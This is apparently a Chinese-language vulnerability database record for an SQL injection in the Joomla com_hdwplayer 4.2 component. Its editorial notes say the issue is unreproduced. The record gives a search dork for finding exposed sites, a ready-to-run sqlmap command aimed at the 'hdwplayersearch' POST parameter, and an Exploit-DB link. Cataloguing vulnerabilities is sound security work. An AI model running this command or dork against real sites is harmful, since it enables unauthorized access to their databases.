---
source: "hatch 补库批 20260928"
product: "Joomla HDWPlayer4.2 component"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Joomla! com_hdwplayer 4.2 - 'search.php' sql注入"
prerequisites: "来源所述条件，未列明部分仍待核：com_hdwplayer搜索可达；鉴权不明"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-22104be44642bfb0fe87c6be"
entity_id: "ve-22104be44642bfb0fe87c6be"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：com_hdwplayer搜索可达；鉴权不明

- **结论使用边界（1）**：只有sqlmap命令无实际SQL载荷/响应，不能视为已复现结果。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：EDB48242明确出处可回源；search.php为组件代码名而请求走index路由，需说明。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Joomla com\_hdwplayer 4.2 - \'search.php\' sql注入

一、漏洞简介
------------

关键字:inurl:\"index.php?option=com\_hdwplayer\"

二、漏洞影响
------------

com\_hdwplayer 4.2

三、复现过程
------------

    python ./sqlmap.py -u "http://127.0.0.1/joomla/index.php" --method=POST --random-agent --data "option=com_hdwplayer&view=search&hdwplayersearch=xxx" --level=5 --risk=3 --dbms=mysql -p hdwplayersearch

参考链接
--------

> https://www.exploit-db.com/exploits/48242
